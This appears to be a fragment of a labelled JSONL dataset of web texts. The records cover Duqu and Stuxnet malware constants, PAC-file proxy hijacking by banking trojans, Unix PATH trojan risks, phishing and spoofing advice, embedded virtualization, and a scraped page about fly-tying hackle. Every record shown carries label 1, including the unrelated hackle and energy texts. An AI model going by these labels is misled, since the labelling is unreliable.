criminals in some post-modern perversion of Charles Bronson's character in Death Wish.\nWe hope they are just fans of Dexter.\nInterestingly, the same constant can be found in Duqu as well. The Hungarian CrySyS lab was the first to point out the usage of 0xAE790509 in Duqu. In the case of Stuxnet, the integer 0x19790509 is used as an infection check; in the case of Duqu, the constant is 0xAE790509.\nWhat is less known is that 0xAE790509 was also used in Stuxnet, however, prior to Duqu this was not included in any of the public analyses we are familiar with.\nThere are also many other places where the constant 0xAE is used, both in Duqu and Stuxnet.\nFinally, the constant 0xAE240682 is used by Duqu as part of the decryption routine for one of the known PNF files. In case you are wondering, 24 June 1982 is indeed an interesting date - check out the case of BA flight 9.\n* Research by Kaspersky Lab Global Research & Analysis Team.\nCostin Raiu of Kaspersky Lab's Global Research and Analysis Team talks about the investigation into Duqu, the likelihood that it was written by the same team as Stuxnet, whether a government is behind its development and what mistakes the authors made.\nDownload the podcast from the Threatpost site.\n2011 Oct 22, 20:01\nDuqu can steal everything?\n@Symantec says this is targeted to specific organizations, possibly with a view to collecting specific information that could be used for future attacks. What kinds of data are they looking for and what kinds of future attacks are possible?", "label": 1}
{"text": "- Definition of hackle in the Online Dictionary. Meaning of hackle. Pronunciation of hackle. Translations of hackle. hackle synonyms, hackle antonyms. Information about hackle in the free online English dictionary and encyclopedia. saddle hackle. — “hackle - definition of hackle by the Free Online Dictionary”,\n- Far West Fly Shop offers the best selection of fly tying hackle, including Whiting hackle fly and a variety of tying capes. Find the best quality here. — “Fly Tying Hackle - Whiting Hackle | Fly Tying Capes”,\n- The Hook & Hackle Company encourages support of those \"Wounded Warriors\" who have The Hook & Hackle Company Guarantee. If for any reason you're unhappy with any Hook & Hackle brand product, for whatever reason,. — “Hook & Hackle Company”,\n- Definition of hackle from Webster's New World College Dictionary. Meaning of hackle. Pronunciation of hackle. Definition of the word hackle. Origin of the word hackle. — “hackle - Definition of hackle at ”,\n- Guide and fly shop serving Rock Creek and the Bitterroot, Blackfoot, and Clark Fork Rivers of Western Montana. The Grizzly Hackle has the area's finest guiding staff, a dedicated crew that has introduced thousands of anglers - beginners and experts alike - to the trout of western Montana. — “Grizzly Hackle The Premier Fly Shop and Outfitter in the”,\n- The hackle is a feather plume that is attached to the headdress. In the British Army and the armies of some Commonwealth countries the hackle is worn by some infantry regiments, especially those designated fusilier regiments and those with Scottish and Northern Irish origins. — “Hackle”,\n- Conranch Hackle produces a Premium dry fly hackle that is second to none. This is an old flock that has consistently produced top quality hackle and saddles. — “Conranch Fly Tying Hackle”,\n- Definition of word from the Merriam-Webster Online Dictionary with audio pronunciations, thesaurus, Word of the Day, and word games. plural a : erectile hairs along the neck and back especially of a dog b : temper, dander. — “Hackle - Definition and More from the Free Merriam-Webster”, merriam-\n- Quality custom tied flyfishing flies for the discriminating flyfisherman. Welcome to ! Welcome to ! We offer hand-tied flies tied by expert fly tier David Tomé. A variety of field tested fly patterns are available as well as custom tied flies. — “Welcome to !”,\n- Learn about Hackle on . Find info and videos including: How to Tie a Wet Hackle, Types of Soft Hackles, How to Use Hackle Pliers for Fly Fishing and much more. — “Hackle - ”,\n- The terms \"hackling a fly\" or \"wrap the flies hackle\" refers to tying a feather and wrapping it around the hook shank of the fly. Hackle from a rooster are usually used for dry flies because they are hard and stiff, do not soak up water and support the fly on the water. — “Fly Tying Hackle Selection, Fly Tying Workshop and”,\n- West Yellowstone fly shop with a huge selection of Whiting hackle, saddle hackle and fly tying materials from JimsFlyco at great prices. — “Whiting Hackle | West Yellowstone fly shop | JimsFlyco”,\n- (usually now, in plural) By extension (because the hackles of a *** are lifted when it's angry), the hair on to hackle (third-person singular simple present hackles, present. — “hackle - Wiktionary”,\n- hackle n. Any of the long, slender, often glossy feathers on the neck of a bird, especially a male domestic fowl. — “hackle: Definition from ”,\n- Shop for Hackle. Price comparison, consumer reviews, and store ratings on . — “Hackle - - Product Reviews, Compare Prices, and Shop at”,\n- W. W. Doak Miramichi Atlantic Salmon Fly Fishing Tackle Shop - Sage, St.Croix, Islander, Lamson, Ross, Teton, Abel, S. A. Mastery, Simms, Atlantic Salmon Flies & Leaders Althought it is not as long as the hackle found on most saddle patches, it is a little wider, making it better for larger flies. — “Hackle - W. W. Doak and Sons Ltd. Fly Fishing Tackle”,\n- hackle lodge luxury hotel accommodation Mpumalanga,dullstroom,fly fishing leisure cottagesSouth Africa.Hackle Lodge,Machadodorp,beautiful countryside 2 hours drive from Johannesburg,Gauteng. — “Hackle Lodge Country Estate,South Africa-Luxury lodge”,\n- Hackle definition, one of the long, slender feathers on the neck or saddle of certain birds, as the domestic rooster, much used in making artificial flies for See more. — “Hackle | Define Hackle at ”,\n- The hackle is a feather plume that is attached to the headdress. In the British Army and the armies of some Commonwealth countries the hackle is worn by some infantry regiments, especially those designated fusilier regiments and those with Scottish and Northern Irish origins. — “Hackle - Wikipedia, the free encyclopedia”,\n- howard hackle is a family operated hackle farm located in didsbury, alberta, canada. our northern location leads to enhanced hackle quality as the birds adapt with increased feather population and barb count. this produces the highest quality. — “Welcome to Howard Hackle: About Us”,\n- Hackle Pliers Manufacturers & Hackle Pliers Suppliers Directory - Find a Hackle Pliers Manufacturer and Supplier. Choose quality Hackle Pliers Manufacturers, Suppliers, Exporters at . — “Hackle Pliers-Hackle Pliers Manufacturers, Suppliers and”,\n- Fly Tying Materials, Rare Fly Tying Materials, Fly Tying Vises, Tube Fly Materials, Tube Flies, Fly Tying - Hackle, Medium Dyed Blue Eared Pheasant, Barred Variant Schlappen, Spey Plumes, Blue Eared Pheasant, Dryfly Hackle, Ostrich, Schlappen,. — “Fly Tying Materials, Rare Fly Tying Materials, Fly Tying”,\nrelated images for hackle\n- Quotes for custom colors and quantities available by request Email the office Colors Available Blue Green Teal Black Purple Black Blue Black Red Black Orange Black Green Black Lt Blue Black\n- I think the flames would be a progression of the red to orange to gold to chartruse I m worried that the pink feathers would not carry to the bottom but I don t want a fire colored bust\n- hackle2 jpg\n- もありけっこう病みつきになっていきます 評判の良かったものを巻こうとすると マテリアルが足りなくなり最近は買い足しています 写真のハックルはホワイティングのシルバーグレードですが さすがホワイティング博士 その進化たるや信じられないほどです\n- hackle1 JPG\n- ＣＯＱ ＤＥ ＬＥＯＮ Ｓｏｌｉｄ 蛍光オレンジ ¥１５００ ＵＰ画像 通常 Ｃｏｑ Ｄｅ Ｌｅｏｎ はドライフライのテールやマドラーミノーのハックル等にお使いいただけますが 今回\n- The price will be determined by current market prices for steel and the US dollar vs the Canadian dollar Please send your specificaitons and I will get a current price for you And here is the man that makes all these combs possible\n- hackle1 jpg\n- 21mm x 56mm 7 8 x 2 1 4 Jaw length 8mm 5 16 Price is $3 95 each\n- 1 per color in stock for special price $35 00 ea Quotes for custom colors and quantities available by request Email the office\n- Homer s Newest Fly Shop and KGB headquarters the Hackle Shack offers hand tied flies premium gear and guided trips to world class places Knowing Where to Go The Hackle Shack offers a large menu of guided trips and here are just a few 7 Days on the Alagnak The Alagnak offers one\n- Wind the hackle from the front through 3 turns making sure the fibres do not trap each other back towards the thread Tie off the hackle with 2 3 turns and snip off waste as close to the hook as possible\n- インド Ｃｏｃｋ サドル ダイド 全３種 ¥５８０ Ｆｌｙ Ｓａｍｐｌｅ こちらから ＵＰ画像 ◇蛍光オレンジ ◇蛍光イエロー ◇蛍光グリーン スペイ コック ハックル ナチュラル 全３種 ¥５５０\n- =DOWNLOAD= 3d example files\n- Here s one with saddle and pea*** in the loop Finished body\n- Finished body Sorry bout the poor pics I kinda rushed this post but you get the idea Wasatch made a very comprehensive DVD with Mitch demonstrating all the techniques of the tool It takes some\n- hackle jpg\n- live in a human world Kind of a reverse Dr Doolittle gadget Very cool photo reads I really love you 90 wpm Alright 80 wpm Walkies 55 wpm I d Like My Dinner 40 wpm Update 3 7 08 I received a lovely note from James Auger one of the LED Dog Tail Communicator designers He shared one of his other ingenious dog devices The Augmented Dog Hackle\n- click for larger pics Then I got the hackle out and processed the grapejuice dyed fiber shetland + silk and the red cabbage dyed fiber shetland + silk + mohair\n- eq2 hackle jpg\n- Metz hackle1 JPG\n- ＣＯＱ ＤＥ ＬＥＯＮ Ｍｅｄｉｕｍ Ｐａｒｄ 蛍光オレンジ ¥１５００ ＵＰ画像 通常 Ｃｏｑ Ｄｅ Ｌｅｏｎ はドライフライのテールやマドラーミノーのハックル等にお使いいただけますが 今回の\n- Round Rubber Hackle jpg\n- 羽毛 人造材料\n- hackle stac jpg\n- <ハーフ カット> 全６色 ¥２７００ ¥３２００ ◆ナチュラル ◆ブラウン ◆オリーブ ◆ダークブラウン ◆イエロー ◆オレンジ 左から ◆ナチュラル ◆ダークブラウン ◆オリーブ ◆ブラウン ◆イエロー ◆オレンジ\n- Now tie in a Blue Hackle and a Black Hackle wind the hackles together down the body and secure with the rib\n- <ハーフ カット> 全６色 ¥２７００ ¥３２００ ◆ナチュラル ◆ブラウン ◆オリーブ ◆ダークブラウン ◆イエロー ◆オレンジ 左から ◆ナチュラル ◆ダークブラウン ◆オリーブ ◆ブラウン ◆イエロー ◆オレンジ\n- Wired Bead Head Prince Nymph http www riverbum com images produ dHead side jpg Soft Hackle CDC Nymph http planettrout files wordpress c oft hackle jpg Brown Mini Mirage Stone http www littledeschutesflyco com minimirage JPG\n- thackles jpg\n- rozwiązania Jednak wiązanie spadochroniarki nie wymaga aż takich zachodów Jak pokazuje to wideo spadochroniarkę można ukręcić w dwie minuty przy użyciu zwykłego imadła i rotacyjnych szczypców do jeżynek ten przyrząd przyda się do wiązania także innych much Kilka uwag proszę zauważyć że krętacz nawija jeżynkę od góry do dołu i mocuje ją\n- フライ用 ＳＡＤＤＬＥ ＣＡＰＥ ＣＵＴ ¥１０５０ ２２５０ ドライフライ用 ＣＯＣＫ ＮＥＣＫ １ ２ ¥２０００ ３８００ ＵＰ画像\n- 左から ◆ブラウン ◆オリーブ ◆ナチュラル\n- ＨＥＢＥＲＴ ＭＩＮＥＲ ＲＯＯＳＴＥＲ ＣＡＰＥＳ ¥７０００ 左から ＳＯＬＤ ＯＵＴ ＳＯＬＤ ＯＵＴ ◆Ｄｕｎ Ｂａｄｇｅｒ ◆Ｍｅｄｉｕｍ Ｇｒｅｙ Ｄｕｎ ◆Ｄａｒｋ\n- COLORS Chinese View Colors\n- hackle storm jpg\n- it has a strong grip and can be used as a short temporary bobbin The smaller ones can be hard to use if one suffers from arthritis or lack strength in fingers All items made in India 8mm x 48mm 5 8 x 1 7 8 Jaw length 6mm 1 4 Price is $3 00 each\n- ＨＥＢＥＲＴ ＭＩＮＥＲ ＲＯＯＳＴＥＲ ＣＡＰＥＳ ¥７０００ 左から ＳＯＬＤ ＯＵＴ ＳＯＬＤ ＯＵＴ ◆Ｌｉｇｈｔ Ｇｏｌｄｅｎ Ｏｌｉｖｅ ◆Ｙｅｌｌｏｗ\nrelated videos for hackle\n- Blending Hackle #1 How To Make Smooth Roving & Diz It Off how to make and diz smooth roving using mill prepped fiber\n- The Partridge and Yellow Soft Hackle Tying and fishing the classic Partridge and Yellow soft hackle fly.\n- Palmering Hackle Demo with Jay Nicholas In this new fly tying video, Jay Nicholas demonstrates the right way to palmer hackle on flies like wooly buggers, stimulators -- basically any fly that uses a hackle down the hook. For more fly tying tips, check out .\n- Holy Molar - Hackle The Hackle section from the Holy Molar - Dentist The Menace DVD. Sorry it's in black and white. But it does add raw emotion to it.\n- The Red Hackle Pipe Band - Marching Training #1 The Red Hackle Pipe Band gets taught how to march decently. The special guest and teacher for today is none other than [name to be posted later... maybe...], an ex-member of the Black Watch!\n- Parks' Fly Shop: Tying the White Miller Soft Hackle This is a fuzzy-bodied soft hackle caddis emerger pattern that's deadly on the Firehole River in June and September, where it imitates the Nectopsyche caddis. Hook: short shank dry #14. Thread: 8/0 light cahill Uni. Abdomen: pearl Ice Dub dubbed rough. Thorax: light shade Arizona Synthetic Pea*** dubbed rough. Hackle: cream hen.\n- Fly Tying: How to Tie the Woolly Bugger : Tying the Hackle & Rib: Woolly Bugger Fly Learn how to tie the hackle and rib of a Woolly Bugger fly in this free video on fly fishing. Expert: Jeff Wilkins Bio: Jeff Wilkins is that rare fly fisherman who is equally skilled at the tying bench and on the stream. A certified casting instructor, Wilkins began tying and guiding professionally in college. Filmmaker: Tom Jackson\n- Tying the Hackle Stacker Tying the Hackle Stacker BWO. Materials: #14 Emerger Hook, 8/0 Olive-Brown Thread, Gray Antron, Olive Turkey Biot, Olive CDC, Grizzly- Dyed Olive Hackle, Dark Green Spectrablend Dry Dubbing.\n- Tying the Partridge and Orange Soft Hackle Jeff Hines deomonstrates tying the Partridge and Orange soft hackle fly. Filmed at the 2003 FFF Southern Council Conclave in Mountain Home, Arkansas.\n- Spey Fly Hackles Atlantic Salmon Steelhead Fly Fishing Here is a simple way to make Spey hackles for fishing flies. The cost factor for using Blue Eared Pheasant and the like is just too high. Here is a way to make a great hackle at a fraction of the cost. Make sure you brush the wet feathers into shape and lay flat on paper to dry.\n- Gartside Soft Hackle\n- Bead Head Pheasant Tail Soft Hackle Fly tying demonstration of the bead head pheasant tail soft hackle. A fly tied with pheasant tail body, a pea*** herl thorax, and partridge soft hackle.\n- DIY Hackle loading This video shows how to load fiber onto a DIY Hackle made from hair picks and a board. For how to make this hackle....\n- Fiber Hackle, Wool Roving, Diz Removing blended wool from a hackle with an improvised diz; creating blended wool roving. The thin plastic diz was made from a coffee lid at Starbucks. The handmade hackle came from *fiberwish*/punkiedoodledo on Etsy and eBay.\n- Hackle Selection: Picking a feather for steelhead fly collars How do you pick a feather for hackling a steelhead fly? What kind of hackle do you use for a nice collar? Barrett Christiansen from The Caddis Fly Shop lays out the various hackles available, and weighs the pros and cons of each option. For more fly tying videos, check out .\n- How to palmer schlappen and hackle steelhead jigs. This is a brief tutorial on how to palmer schlappen and hackle steelhead jigs using solid brass beads instead of lead for the jig head.\n- Fiberwish Wool and Fiber Hackle How to use the Fiberwish Wool and Fiber Hackle.\n- Fly Tying - Part 8 - Hackle Nor-Vise Fly Tying System. Created by Norm Norlander, this is a great tool for any fly fisherman who wants to learn how to tie their own flies. Website: www.nor-\n- Tying the Hackle Stacker How to tie Quigley's Hackle Stacker with Missouri River guide Mike Kuhnert.\n- Tying the Holographic Soft Hackle Robert Prytula demonstrates tying his Holographic Soft Hackle fly, an effective fly for trout in East Tennessee. I've fished this fly in cloudy water conditions and it was very effective. Tie some up just for these conditions. Filmed at the 2007 FFF Southern Council Conclave in Mountain Home, AR.\n- Fly Fishing with a Woolly Bugger : How to Palmer Woolly Bugger Hackle Palmering the woolly bugger's hackle forward. Learn how to go fly fishing with awoolly bugger fly in this free video on fly tying. Expert: Alvin Dedeaux Contact: Bio: Alvin has been a fly fishing guide and casting instructor for 12 years, and has been fly fishing for 32 years. He is a graduate of the Joan Wulff fly casting instructor's school. Filmmaker: MAKE | MEDIA\n- Tying standard hackle tip wings Using hackle tips to create standard Adams style dry fly wings\n- Wool Combing, Fiber Combs, Hackle and Tools #2 Hand Made Fiber Tools by Blue Mountain Handcrafts and Combing Cria Alpaca into Smooth Spinnable Fiber.\n- Free Fly Tying Instructions: Parachute Adams Pattern : How to Wrap the Hackle: Fly Tying Pattern for Parachute Adams Learn how to wrap the hackle of a Parachute Adams artificial fly - free fly tying video instructions.\n- Fly Tying Dave's Soft Hackle Hook: Size 20 to 14 Diiachi or equivalent Body: Black Thread or color to match the hatch Thorax: Rabbit Dubbing or pea*** Rib: Copper or color to contrast Hackle: Hungarian partridge or equivalent This fly may be fished across and downstream\n- Soft Hackle Ray Charles - July 2009 TPO Fly of the Month Aaron ties up a tailwater killer. Justin and Aaron destroyed them at the Big Horn and several other Montana tailwaters with this. Easy and quick to tie, this fly is a must have for your next trip to a bottom release. The 20 inch rainbows couldn't stay off this at another famous Montana river.\n- How to add hackle to a parachute fly How to add a hackle to a parachute fly as demonstrated by Andrew Blake, a fishing guide from Turangi near Taupo in New Zealand. Check out his website at\n- Frisco kid Hackle you Frisco kid Hackle-you Belly\n- Chris Reeves' Soft Hackle Irish Mayfly - TPO Guest Fly # 2 Chris Reeves of the UK ties a staple of his box. He is an avid still water fisherman and fly tyer. Try out this soft hackle next time you are fishing in the film.\n- How to Wind Hackle How to wind hackle onto your dry fly as demonstrated by Andrew Blake, a fishing guide from Turangi near Taupo in New Zealand. Check out his website at\n- Tying a Soft Hackle Fly Wayne Walts, of Troutfitter, a fly fishing specialty shop in Syracuse, demonstrates tying a soft hackle fly. He's using a size 14 hook and a hen feather. Visit for more news and multimedia.\n- Chewee Skin Green McKenzie Soft Hackle In this video Barrett Christiansen demonstrates how to tie a Chewee Skin Green McKenzie Caddis Soft Hackle. This pattern imitates the large McKenzie Caddis that emerges on the McKenzie River near Eugene late April-June. The UV Chewee skin is a new and easy to use material for bodies, wing cases and shell backs. The UV quality to the material allows for the colors to show better to fish at distance and low light conditions. Fish this fly under a dry, swung wet fly style or skated near on on the surface.\n- Tying the Royal Coachman SoftHackle by Davie McPhail\n- Tying Tips 2 - Selecting Feathers for Soft Hackle Flies Jeff Hines discusses the selection of feathers for tying soft hackle flies. Filmed at the 2003 FFF Southern Council Conclave in Mountain Home, AR.\n- Wool Combing, Fiber Combs, Hackle and Tools #1 Hand Made Fiber Tools by Blue Mountain Handcrafts.\n- Tying with Hans- Hans' Spring Soft Hackle This easy to tie soft hackle pattern takes early season trout feeding on midges or emerging baetis mayflies. The purple thorax seems to be a trigger to trout. This fly can be fished deep behind a nymph, on the swing, or as a dropper a few inches behind a dry fly. Happy Tying\n- Hare's Ear Soft Hackle fly tying instructions The Hare's Ear Soft Hackle is just an all around great fly. This buggy little wet fly fishes great as a March Brown emerger on the Lower McKenzie River in the early spring. Easy to tie and great to have in the fly box. For more fly tying videos, check out .\n- Fly Tying with Hans: Soft Hackle Soft hackles have been around for a long, long time. In the video I say a hundred years; well I looked it up, try 500 years! There must be a reason- ah yes, they catch fish. These are simple flies to tie and they work extremely well. Experiment with various color schemes and materials.\n- Fly tying feathers: Hackle folding instructions Fly tying guru Jay Nicholas demonstrates how to fold and hackle fly tying feathers in this new video. For more fly tying demos and instructions, check out\n- Tying The Soft Hackle Nymph Using Micro Straggle All materials are available at Fly Tying Specialties. Provided by Steve Korbay at Fly Tying Specialties\ntwitter about hackle\nBlogs & Forum\nblogs and forums about hackle\n“Posted: Friday, April 17th, 2009 @ 7:41 pm in Crochet, Etsy, Family, Fiber Prep, Hackle, dyed, natural dying | 2 Comments \" Horner. Craft & Found. Craft Pattern Podcast. . Crochet Liberation Front blog. Etsy french Blog. InspireMeThursday”\n— Chez Plum \" Hackle,\n“PaFlyFish is your source for Pennsylvania fly fishing for trout and bass with stream reports, forum, maps, hatch charts and blog”\n— Pennsylvania Fly Fishing - new hackle [Forum - Fly Tying],\n“photos of Dullstroom wedding photography at Critchley Hackle \" Wedding Photography by Dror Eyal : South Africa wedding photographer”\n— Dullstroom wedding photography at Critchley Hackle \" Wedding, droreyal.co.za\n“Whats the best hackle?”\n— Whats the best hackle?,\n“We stayed at Critchley Hackle, in Dullstroom, on 22nd February, as an overnight stop on our way from Johannesburg to the Kruger Park. First comment it”\n— Our Visit to Critchley Hackle | African Safari and Travel News,\n“CARI Malay Forums Salam, nak tanya kenkawan kat sini, apa beza hackle warna warni yg dipakai ROTU tu?maksud saya, kalo warna oren dari mana?warna2 lain pulak dari man”\n— HACKLE - Agensi Keselamatan, Polis & Tentera - CARI Malay Forums, .my\n“Home \" Dennis Potter's Blog \" Ramblings of a Hackle Junkie The deeper you fish a soft hackle, the fewer fish you catch, but the size goes up. I”\n— Ramblings of a Hackle Junkie by Dennis Potter,\n“Majacraft now makes single and double row hackles”\n— Hackle-berry Finn | The Majacraft Blog, majacraft.co.nz\n“Fly Days of August: Orange PT Soft Hackle. August 19th, 2009 · No Comments. This has become Soft Hackle Materials. October 25th, 2008 · 7 Comments. Lets start with the hackles, where”\n— Soft Hackle,", "label": 1}
{"text": "Proxy auto config (PAC) is a feature accepted by all modern browsers, according to Fabio Assolini, a lab expert at Kaspersky. It contains a function to redirect browsers to a specific proxy server. A proxy server is a computer that accesses the Internet on a computer user's behalf, and feeds it the results. Proxy servers are often used by systems administrators as a gateway between an organization's computers and the Internet, and PAC files are set on client machines so that they always access the Internet through a protected gateway.\n\"Unfortunately this simple and smart proxy technique is being largely used by Brazilian malware writers to redirect infected users to malicious hosts serving phishing pages of financial institutions,\" Assolini said. \"After being infected by a Trojan banker, if a user tries to access some of the websites listed in the script, they will be redirected to a phishing domain hosted at the malicious proxy server.\"\nEven browsers designed securely from the bottom up, such as Google's Chrome, are susceptible to this attack, which changes the file prefs.js to insert a malicious proxy before adding a malicious dynamic link library to always rewrite the proxy, if it is removed.\nThis attack is an interesting variation on a more conventional redirection attack involving the Windows Hosts file. This is a plain text file containing a list of Domain Name System lookups, which a Windows computer will refer to first, before trying to resolve a domain name using an external server. Malware that alters DNS entries in a Hosts file instructs a Windows computer to visit any malicious IP address that the attacker wants when the user types in a legitimate web address, such as one for an online bank, for example.", "label": 1}
{"text": "The path is sometimes a big security problem. It is a very common way to hack into a system using some mistakes in path settings. It is easy to make Trojan horse attacks if hacker gets root or other users to execute his versions of commands.\nA common mistake in the past (?) was to keep '.' in the root's path. Malicious hacker makes program 'ls' in his home directory. If root makes\n# cd ~hacker # ls\nhe executes ls command of hacker's.\nIndirectly, this same applies to all the programs that are executed as root. Any of the important daemon processes should never execute anything that some other user can write into. In some systems, /usr/local/bin is allowed to contain programs with less strict security screening - it is just removed from the path of the root user. However, if it is known that some daemon executes 'foo' using path '/usr/local/bin/:...', it may be possible to cheat daemon to execute '/usr/local/bin/foo' instead of '/bin/foo'. Likely anybody who can write to '/usr/local/bin' is able to break into the system.\nIt is very important to consider in what order the directories are in the path. If /usr/local/bin is before /bin, it is a security risk - if it is after, it is not possible to overwrite command /bin/foo with some localized modification in /usr/local/bin/foo.\nIn Linux it should be remembered that the path evaluation is done in the operating system call level. Everywhere where an executable file path is given you can give a short name that is searched at least from /bin and /usr/bin - likely from many other places as well.", "label": 1}
{"text": "Virtualizing the Embedded World: Vista Over Linux in a Cell Phone?\nMotivation for Running a Hypervisor on Embedded Systems\nWhile you probably won't run Vista as a virtual machine on your cell phone, there are many viable use cases of virtualization for embedded applications. The most simplest, cheapest, feature rich is using Linux and KVM.\nServers and desktops are not alone, virtualization is also a perfect fit for embedded devices too.\nVirtualization benefits are well understood for the traditional server consolidation purposes. Hypervisors, aka virtual machine monitors (VMM) are common in almost every data center, saving equipment, power and management costs. Embedded applications, ranging from terabit routers, hardware appliances, media-rich set-top boxes to cellular phones and media players can all benefit from virtualization.\nAt a glance it may looks like an over kill to run virtual machines on embedded systems (see Figure 1). Embedded systems might be resource limited, having limited memory/CPU/latency/scheduling. They are also often tailor-made to match specific hardware/software combinations. Deeper insight reveals many advantages of virtualization for embedded:\n- Consolidation--Expensive custom-made hardware increase the motivation to consolidate several physical devices into a single one. Consolidation also helps to reduce complexity for distributed environments--All the virtual machines live on the same physical server, there are no risks of network partitioning, hardware failures are atomic and a common high availability (HA) solution deal with them while collapsing many scenarios.\n- Security--Breaking into the cellular phone management/java stack won't jeopardize the communication stack and the main cell if each of them is run in a different virtual machine (VM). The VM environment is a big sand box for untrusted code.\n- Reliability--Isolate privileged code and prevent/reduce entire device failures\n- Management and rapid development--Even if running RTOS for managing the hardware, there is no need to settle for its limited management capabilities. A management VM running Windows can run the user interface, making both users and developers life easier.\n- Hardware virtualization--VMM is an exact fit for hardware virtualization, dynamically divide and unit physical resources along with their virtual controller. Large, distributes embedded machines such as routers can be split and unite along with the router engine machine, executed as a VM.\n- Efficiency--In the multi-core era many physical cores are under-utilized, some not even initialized since the embedded software was uni-processor\n- New exciting features--Sophisticated features like snapshots, live migration, external hibernation can enhance embedded products that tend to demand high availability, upgradability (even remote kernel upgrades), etc\n- Law--Unlinkage of the GPL code from proprietary code can be easily obtained using virtualization\n- Skip Ahead\n- 1. Motivation for Running a Hypervisor on Embedded Systems\n- 2. Motivation for Running a Hypervisor on Embedded Systems\n- 3. Motivation for Running a Hypervisor on Embedded Systems\n- 4. Motivation for Running a Hypervisor on Embedded Systems\nSolid state disks (SSDs) made a splash in consumer technology, and now the technology has its eyes on the enterprise storage market. Download this eBook to see what SSDs can do for your infrastructure and review the pros and cons of this potentially game-changing storage technology.", "label": 1}
{"text": "What is phishing?\nPhishing is an attempt to steal sensitive information, such as your social security number or passwords, by posing as a trusted company. It is most commonly attempted via an email that will claim to come from a trusted company, such as your bank or your credit card company. If you follow the links provided in the email, you will appear to be providing your information to the trusted company, while in fact you will be providing that information to a phisher. Phishers are known for using this information for identity theft and other fraudulent acts.\nHow do I recognize phishing?\nPhishing attempts are getting more and more difficult to recognize. There are some general rules of thumb that can help you identify them.\nFirst, companies should not ask you any sensitive information via email. Legitimate companies that require sensitive information from you will typically send you a physical letter or require that you come in to their place of business to confirm your identity. If an email contains a link that you can click on, you should be suspicious.\nSecond, if the information request appears to come from a company that you do use, such as your bank, and you are unsure if it is a phishing email or not, give them a phone call instead of following the link in the email.\nThird, almost any company that can contact you via email could also contact you via phone. Despite whatever consequences of not responding are listed in the email, consider not responding. Almost all large companies, especially financial institutions, will attempt to contact you through a means other than email before taking any action against your account.", "label": 1}
{"text": "But what if someone you trust urged you via e-mail to download a seemingly important file – would you do that?\nIt’s no secret that criminals often hide their true identity in order to trick people into falling for their scams. And it’s so easy to pose as someone else on the internet, especially since those who you’re talking to can’t really see you. Impersonating someone else in order to trick potential victims into taking certain actions that they wouldn’t normally take is one of the most common tactics used by cybercriminals to make their internet security scams successful. Not only can cybercrooks successfully pass as someone else, but they can also design programs and websites to look like other legitimate ones. In either case, we’re talking about spoofing – the art of online masquerading, as most internet security experts call it.\nSpoofing versus phishing\nA common misconception about spoofing is that it’s the same thing as phishing. In fact, they’re two different internet security threats, but strongly tied to one another. Phishing is basically tricking someone to give up sensitive information – usually social and bank account credentials and credit card details. Spoofing, on the other hand, refers to how cybercrooks actually trick their target – by posing as a well-known, trustworthy entity. So, more often than not, phishers rely on spoofing in order for their phishing scams to be successful.\nFor example, you receive an e-mail from your bank telling you your account has been suspended for whatever reason, and in order to reactivate it, you have to hand over your credit card details. This, clearly, is a phishing attempt – your bank would never send you such e-mails! And the fact that the e-mail seems to come from your bank, when in fact it doesn’t – that’s spoofing.\nThe most common forms of spoofing\nSpoofing is one of the oldest tricks in the book – cybercriminals’ book, that is – but also one of the most effective in breaching web users’ internet security. Over the years it has taken on various forms, depending on technological advancements and trends in web users’ activity. Here are the most common forms of spoofing you’re most likely to come across in the WWW:\n- E-mail spoofing. The example provided above is actually a form of e-mail spoofing. The sender address and the signature are made up to appear as though the e-mail was sent by a certain person or company. To make their e-mails look authentic and credible, cybercrooks have spoofed e-mail sender sections by listing names of renowned banks and websites like eBay, Amazon and PayPal, and continue to do so.\n- URL spoofing. In some internet security scams, cybercrooks reproduce legitimate webpages and send the legit-looking web address (URL) in fake e-mails to web users or place it on other sites. When a user clicks on it, they’re redirected to the malicious site. Cybercrooks can also create malware that exploits web browser vulnerabilities; if a user unknowingly downloads it onto their PC, the malicious bit can manipulate their browser to show, for example, a fake bank account login page, whenever they browse for the real thing. In this particular case, the user is faced with a man-in-the-browser attack.\n- Spoofing files on file-sharing platforms. Not all files you find on popular file-sharing platforms are legitimate. Some of them may look like the real thing, with the same name/title/author, but in fact they may be fake and contain some kind of malware.\n- IP spoofing. Hackers can gain unauthorized access to computer networks by making the IP address of their computer look like the one of a trusted machine. This way they can perform network attacks and make them look as being performed by another entity.\n- Wi-fi spoofing. Some Wi-fi hotspots can look like they’re owned by reputable companies, but in fact, they’re set up by cybercrooks who want to steal data received or sent by users.\nProtect yourself from spoofers!\nHere’s a bunch of solid internet security tips to protect yourself and your device from the threats listed above:\n- Be suspicious of every e-mail that asks you to hand over personal information, no matter if the sender is a close relative or a trustworthy institution. Remember: your bank would never ask you for your credit card details via e-mail; Facebook would never ask for your account credentials this way either. If you receive an e-mail from them linking to their site, don’t click on the link provided. Instead, open the respective site from a new window, just to avoid accessing a fake one.\n- Beware of phishing attacks. Keep yourself informed about new phishing methods and for extra protection, install an internet security suite that comes with Antiphishing and Safe Browsing to warn you against malicious websites. BullGuard’s internet security suite comes with such features.\n- Don’t be too trusting when it comes to the security of file-sharing platforms. It’s best you have your own security in place, i.e. effective antivirus protection like the one offered by BullGuard Internet Security 12. Its antivirus engine protects your computer even from the newest forms of malware.\n- Make sure you have a solid Firewall installed on your PC, to counter any network attacks from hackers.\n- Be careful with public Wi-fi hotspots. It’s best you don’t bank or shop online while connected to a hotspot, as you never know what prying eyes might be “watching” your transaction and steal your financial details.", "label": 1}
{"text": "Energy Efficient Programming\nIn my most recent job I was looking at energy efficient computing, which is a big deal in mobile computing. Everyone wants their tablet or phone or notebook to run as long as possible on a single charge of the battery. Efficient use of energy is also becoming a really big deal in cloud computing with all those processors sitting in a data center (supporting mobile computing users) and technical computing centers where larger and larger clusters are assembled on the road to Exascale computations. One notable alternative energy source is the supercomputer in the Advania Thor Data Center in Iceland, which uses hydro- and geothermal energy that is relatively cheap. (I wonder if they simply open a window to cool down the data center machines.)\n- IDC Analyst Connection: Using Blade Systems to Cut Costs and Sharpen Efficiencies\n- Application Testing Strategies in the IBM z/OS Environment\n- Strategy: How to Conduct an Effective IT Security Risk Assessment\n- Strategy: Smartphone Smackdown: Galaxy Note II vs. Lumia 920 vs. iPhone 5\n- The Untapped Potential of Mobile Apps for Commercial Customers\n- Why is Information Governance So Important for Modern Analytics?\nAs with processor speeds in the run up to multicore processors for the masses, the energy envelope of hardware is being improved (i.e., lowered) with each new generation. Recently I was made privy to the plans of a large international chip producer and found the numbers impressive as to how low it is going to be taking the power usage in its flagship processors over the next few years. From all this data and the focus on improving energy utilization in 